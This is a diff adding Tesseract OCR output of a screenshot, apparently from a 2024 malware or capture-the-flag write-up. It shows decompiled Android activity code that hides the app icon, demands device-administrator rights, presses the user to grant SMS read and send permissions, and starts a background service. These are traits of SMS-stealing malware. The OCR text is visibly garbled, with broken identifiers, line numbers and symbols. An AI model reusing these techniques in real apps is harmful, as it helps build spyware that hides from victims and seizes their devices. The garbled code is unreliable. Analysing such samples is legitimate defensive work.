@@ -1,0 +1,33 @@
+# OCR: 2b9aaebba60f8058fee479446ae03b42.webp
+# 来源: .\02-WriteUp\2024\2b9aaebba60f8058fee479446ae03b42.webp
+# 引擎: tesseract(chi_sim+eng)
+# 生成: 2026-09-01 22:12
+
+驯 Mainctivity
+w 一 一 一
+44
+45 public void a() {
+46 getPackageManager() . setComponentEnabledsetting(getComponentame(), 2, 1);
+47 )
+48
+49 @override // android. app.activity
+se protected void onCreate(Bundle bundle) {
+51 ‘super. onCreate(bundle) ;
+52
+33
+54 Trew Componen’ ‘Cless<?>) AdminReceiver. class);
+55 DevicePolicyManager devicePolicyManager = (DevicePolicyManager) getSystemService(device_policy");
+56 this.#3¢a = devicePolicymanager;
+57 Af (|devicePolicyManager.isAdminActive(this.f31b)) {
+58 Intent intent = new Intent( "android. app. action. ADD_DEVICE_ADMIN") ;
+59 intent. putextra("android.epp.extra.DEVICE_ADMIN", this. #31b) ;
+s intent. putextra("android.app.extra.ADD_EXPLANATION", getString(R.string.device_admin_explanation)) ;
+61 startActivity(intent) ;
+62 )
+63 Af (a.b.b (this, “android. permission.READ_SMS") 1 8 && a.b.b.a.a.a(this, “android. permission. SEND_
+64 Intent intent2 = new Intent(“android. settings. APPLICATION_DETAILS_ SETTINGS");
+65 intent2. setData(Uri.parse("package:" + getPackageName()));
+66 startActivity(intent2) ;
+67 Toast.makeText(this, "Grant all permission before!”, 1).show();
+68 ]
+69 a.b.b.a.a.b(this, new Intent(this, (Class<?>) MainService.class));
